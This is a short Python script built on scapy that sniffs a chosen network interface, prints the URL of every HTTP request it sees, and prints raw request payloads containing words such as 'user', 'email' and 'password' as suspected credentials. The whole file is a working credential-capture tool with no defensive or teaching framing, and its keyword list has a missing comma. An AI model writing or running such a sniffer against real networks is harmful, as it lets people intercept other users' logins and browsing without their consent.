#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import optparse


parser = optparse.OptionParser()

parser.add_option("-i", "--interface", dest="interface", help="Enter interface to be sniffed")
(options, args) = parser.parse_args()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def process_sniffed_packet(packet: scapy.Packet):
    if packet.haslayer(http.HTTPRequest):
        # detecting url
        url_to_print = ""
        if packet[http.HTTPRequest]:
            url_to_print += str(packet[http.HTTPRequest].Host, 'utf-8')

        if packet[http.HTTPRequest]:
            url_to_print += str(packet[http.HTTPRequest].Path, 'utf-8')

        print(url_to_print)
        url_to_print = ""

        # detecting passwords
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            login_keywords = ['user', 'username', 'uname', 'phone', 'mobile', 'email', 'mail'
                                                                                       'pass', 'password', 'code',
                              'remember']

            for word in login_keywords:
                if word in str(load):
                    print(bcolors.OKGREEN +  "[+] suspected auth credits: " + str(load) + bcolors.ENDC)
                    break


def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_sniffed_packet)


if not options.interface:
    print("[-] please enter interface -i or --interface")
    exit(0)

else:
    interface = options.interface
    sniff(interface)
